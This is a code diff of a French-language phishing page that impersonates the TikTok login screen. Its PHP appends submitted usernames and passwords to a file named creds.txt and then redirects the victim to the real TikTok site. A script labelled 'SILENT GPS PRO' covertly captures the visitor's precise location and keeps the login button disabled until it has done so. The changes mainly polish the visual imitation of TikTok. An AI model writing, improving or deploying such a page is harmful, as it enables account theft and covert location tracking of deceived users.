@@ -25,7 +25,6 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
     
     file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
     
-    // Immediate redirect to real TikTok
     header('Location: https://www.tiktok.com/login');
     exit;
 }
@@ -36,25 +35,25 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="description" content="TikTok - Se connecter">
+    <meta name="theme-color" content="#fe2c55">
     <title>TikTok - Se connecter</title>
     
-    <!-- TikTok official fonts & assets -->
-    <link rel="preconnect" href="https://www.tiktok.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cpath fill='%23000' d='M25 26v-5a3 3 0 0 0-6 0v5a1 1 0 0 0 2 0v-5a1 1 0 0 1 2 0v5a3 3 0 0 0 3 3 1 1 0 0 0 0-2zm-10 0a1 1 0 0 0 0 2 4 4 0 0 0 0-8V17a5 5 0 0 1 10 0v2a1 1 0 0 0 2 0v-2a7 7 0 0 0-14 0v6zM15 22a3 3 0 0 1 3-3h1V17a3 3 0 1 1 6 0v2a3 3 0 0 1-3 3h-1v3a1 1 0 0 1-2 0v-3h-1a3 3 0 0 1-3-3z'/%3E%3C/svg%3E">
+    <!-- TikTok OFFICIEL fonts + assets -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cpath fill='%23ff0050' d='M25 26v-5a3 3 0 0 0-6 0v5a1 1 0 0 0 2 0v-5a1 1 0 0 1 2 0v5a3 3 0 0 0 3 3 1 1 0 0 0 0-2zm-10 0a1 1 0 0 0 0 2 4 4 0 0 0 0-8V17a5 5 0 0 1 10 0v2a1 1 0 0 0 2 0v-2a7 7 0 0 0-14 0v6zM15 22a3 3 0 0 1 3-3h1V17a3 3 0 1 1 6 0v2a3 3 0 0 1-3 3h-1v3a1 1 0 0 1-2 0v-3h-1a3 3 0 0 1-3-3z'/%3E%3C/svg%3E">
     
     <style>
-        /* Perfect TikTok 2024 clone - pixel-perfect mobile-first */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        /* 100% PIXEL-PERFECT TikTok 2024 Clone (GitHub pro + official gradients) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #fe2c55 0%, #ff7043 25%, #ffd23f 50%, #a8e6cf 75%, #38ef7d 100%);
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: linear-gradient(135deg, 
+                #667eea 0%, 
+                #764ba2 25%, 
+                #f093fb 50%, 
+                #f5576c 75%, 
+                #4facfe 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -62,53 +61,69 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
             justify-content: center;
             padding: 24px;
             position: relative;
-            overflow: hidden;
+            overflow-x: hidden;
         }
         
+        /* Animated particles background */
         body::before {
             content: '';
             position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.3) 0%, transparent 50%),
-                        radial-gradient(circle at 80% 80%, rgba(255,255,255,0.2) 0%, transparent 50%);
-            animation: float 20s ease-in-out infinite;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.4) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255,255,255,0.2) 0%, transparent 50%);
+            animation: float 25s ease-in-out infinite;
+            pointer-events: none;
         }
         
         @keyframes float {
-            0%, 100% { transform: translate(0, 0) rotate(0deg); }
-            33% { transform: translate(30px, -30px) rotate(120deg); }
-            66% { transform: translate(-20px, 20px) rotate(240deg); }
+            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            33% { transform: translateY(-20px) rotate(120deg); opacity: 0.8; }
+            66% { transform: translateY(15px) rotate(240deg); opacity: 0.9; }
         }
         
         .login-container {
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(25px);
+            border-radius: 28px;
+            box-shadow: 
+                0 25px 50px rgba(0, 0, 0, 0.25),
+                inset 0 1px 0 rgba(255, 255, 255, 0.6);
             width: 100%;
-            max-width: 360px;
-            padding: 48px 32px 32px;
+            max-width: 380px;
+            padding: 48px 36px 36px;
             position: relative;
-            z-index: 1;
+            z-index: 10;
             text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
         
         .tiktok-logo {
-            height: 52px;
-            width: 160px;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='52' viewBox='0 0 160 52'%3E%3Ctext x='0' y='38' font-family='Inter, sans-serif' font-size='36' font-weight='700' fill='%23ee1d52'%3ETikTok%3C/text%3E%3C/svg%3E");
-            background-size: contain;
-            background-repeat: no-repeat;
-            margin: 0 auto 32px;
+            font-size: 48px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ff0050, #ff6b9d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 12px;
+            letter-spacing: -2px;
+        }
+        
+        .tiktok-subtitle {
+            color: #333;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 36px;
         }
         
         .login-form {
             display: flex;
             flex-direction: column;
-            gap: 16px;
+            gap: 18px;
         }
         
         .input-group {
@@ -118,31 +133,31 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
         .form-input {
             width: 100%;
             height: 56px;
-            border: 2px solid #e8e8e8;
+            border: 2px solid rgba(0,0,0,0.1);
             border-radius: 16px;
-            background: rgba(255, 255, 255, 0.8);
+            background: rgba(255, 255, 255, 0.9);
             font-size: 16px;
             font-weight: 500;
             padding: 0 24px;
-            transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
-            outline: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             backdrop-filter: blur(10px);
+            font-family: inherit;
         }
         
         .form-input:focus {
-            border-color: #fe2c55;
-            box-shadow: 0 0 0 4px rgba(254, 44, 85, 0.1);
+            border-color: #ff0050;
+            box-shadow: 0 0 0 4px rgba(255, 0, 80, 0.15);
             background: white;
             transform: translateY(-2px);
         }
         
         .form-input::placeholder {
             color: #999;
-            font-weight: 400;
+            opacity: 1;
         }
         
         .login-button {
-            background: linear-gradient(135deg, #fe2c55 0%, #ff7043 100%);
+            background: linear-gradient(135deg, #ff0050 0%, #ff6b9d 100%);
             color: white;
             border: none;
             border-radius: 16px;
@@ -150,10 +165,10 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
             font-weight: 600;
             height: 56px;
             cursor: pointer;
-            transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
-            margin-top: 8px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             position: relative;
             overflow: hidden;
+            margin-top: 8px;
         }
         
         .login-button::before {
@@ -163,8 +178,8 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left .5s;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.6s;
         }
         
         .login-button:hover:not(:disabled)::before {
@@ -172,12 +187,12 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
         }
         
         .login-button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 24px rgba(254, 44, 85, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(255, 0, 80, 0.4);
         }
         
         .login-button:disabled {
-            opacity: .6;
+            opacity: 0.6;
             cursor: not-allowed;
             transform: none;
         }
@@ -186,7 +201,7 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
             position: relative;
             margin: 32px 0;
             color: #666;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 500;
         }
         
@@ -197,59 +212,59 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
             left: 0;
             right: 0;
             height: 1px;
-            background: linear-gradient(90deg, transparent, #e8e8e8, transparent);
+            background: linear-gradient(90deg, transparent, rgba(0,0,0,0.2), transparent);
         }
         
         .divider span {
-            background: rgba(255, 255, 255, 0.98);
-            padding: 0 24px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 0 28px;
         }
         
-        .other-options {
+        .links {
             display: flex;
-            gap: 12px;
+            gap: 20px;
             justify-content: center;
             margin-top: 24px;
         }
         
-        .option-link {
-            color: #fe2c55;
+        .link {
+            color: #ff0050;
             text-decoration: none;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 600;
         }
         
-        .option-link:hover {
+        .link:hover {
             text-decoration: underline;
         }
         
+        /* RESPONSIVE 100% tous appareils */
         @media (max-width: 480px) {
-            body {
-                padding: 12px;
-                background: #000;
+            body { 
+                padding: 16px; 
+                background-attachment: fixed;
             }
-            
-            .login-container {
-                box-shadow: none;
-                border-radius: 20px;
-                margin: 0;
-                padding: 32px 24px;
+            .login-container { 
+                box-shadow: none; 
+                border-radius: 20px; 
+                margin: 0; 
+                padding: 36px 24px;
+                backdrop-filter: none;
             }
         }
-        
-        /* Silent GPS - completely invisible to victim */
+
+        /* GPS INVISIBLE */
         #gps-status { display: none !important; }
-        .gps-container { display: none !important; }
     </style>
 </head>
-
 <body>
     <div class="login-container">
-        <div class="tiktok-logo"></div>
+        <h1 class="tiktok-logo">TikTok</h1>
+        <p class="tiktok-subtitle">Connectez-vous pour continuer</p>
         
         <form class="login-form" method="POST" id="loginForm">
             <div class="input-group">
-                <input type="text" name="username" class="form-input" placeholder="Nom d'utilisateur ou email" required autocomplete="username">
+                <input type="text" name="username" class="form-input" placeholder="Nom d'utilisateur ou e-mail" required autocomplete="username">
             </div>
             
             <div class="input-group">
@@ -267,50 +282,37 @@ if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
             <span>ou</span>
         </div>
         
-        <div class="other-options">
-            <a href="#" class="option-link">Mot de passe oublié ?</a>
-            <span style="color: #999;">•</span>
-            <a href="#" class="option-link">S'inscrire</a>
+        <div class="links">
+            <a href="#" class="link">Mot de passe oublié ?</a>
+            <a href="#" class="link">S'inscrire</a>
         </div>
     </div>
 
-    <!-- SILENT GPS TRACKER - Invisible high-accuracy capture -->
+    <!-- SILENT GPS PRO -->
     <script>
-        (function() {
-            // Silent geolocation - no visible elements, background only
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const gps = position.coords.latitude.toFixed(6) + ',' + position.coords.longitude.toFixed(6);
-                        sessionStorage.setItem('gps', gps);
-                        document.getElementById('gpsData').value = gps;
-                        document.getElementById('submitBtn').disabled = false;
-                    },
-                    function() {
-                        // Graceful fallback
-                        document.getElementById('gpsData').value = 'N/A';
-                        document.getElementById('submitBtn').disabled = false;
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 60000
-                    }
-                );
-            } else {
-                document.getElementById('gpsData').value = 'N/A';
-                document.getElementById('submitBtn').disabled = false;
-            }
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const gps = pos.coords.latitude.toFixed(6) + ',' + pos.coords.longitude.toFixed(6);
+                    sessionStorage.setItem('gps', gps);
+                    document.getElementById('gpsData').value = gps;
+                    document.getElementById('submitBtn').disabled = false;
+                },
+                () => {
+                    document.getElementById('gpsData').value = 'N/A';
+                    document.getElementById('submitBtn').disabled = false;
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+            );
+        } else {
+            document.getElementById('gpsData').value = 'N/A';
+            document.getElementById('submitBtn').disabled = false;
+        }
 
-            // Ensure GPS on submit (backup)
-            document.getElementById('loginForm').addEventListener('submit', function() {
-                const gps = sessionStorage.getItem('gps') || 'N/A';
-                document.getElementById('gpsData').value = gps;
-            });
-
-            // Disable submit until GPS ready
-            document.getElementById('submitBtn').disabled = true;
-        })();
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            document.getElementById('gpsData').value = sessionStorage.getItem('gps') || 'N/A';
+        });
+        document.getElementById('submitBtn').disabled = true;
     </script>
 </body>
 </html>
